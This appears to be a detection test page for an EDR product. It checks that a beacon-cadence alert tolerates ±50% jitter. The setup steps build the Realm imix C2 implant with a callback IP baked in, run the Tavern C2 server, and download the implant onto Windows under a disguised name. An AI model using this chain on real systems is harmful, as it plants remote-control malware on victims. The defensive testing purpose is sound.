# Test: Network — beacon cadence detection under jitter

**Chain:** a loopback beacon connecting at a fixed interval **with ±50% jitter** — the
imix default posture (`jitter: 0.5`). Tests that your `NET-BEACON` cadence analysis is
jitter-tolerant, not a naive fixed-interval matcher.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).


**Victim (any PowerShell):** `.\test.ps1` — connects to 127.0.0.1:9443 every 5s ± jitter
for ~2 minutes, holding each connection 2s.

**Expected alerts:**

| Rule | Sev | Trigger |
|---|---|---|
| `NET-BEACON` | critical | cadence analysis: repeated connections at a near-constant interval ± jitter to one peer |

**Timing:** the detector needs several intervals to establish periodicity — expect the
alert around 60–90s in, not instantly.

**Variations to try:**
- Edit `$Interval`/`$Jitter` in the script (10s ±0.3 = imix's documented HTTP default)
- Real imix with `IMIX_CONFIG` http transport, `interval: 10, jitter: 0.5` — same alert,
  plus the full SIG/launch chain from the delivery walkthroughs

**Cleanup:** automatic (script self-terminates; server socket closed on exit).
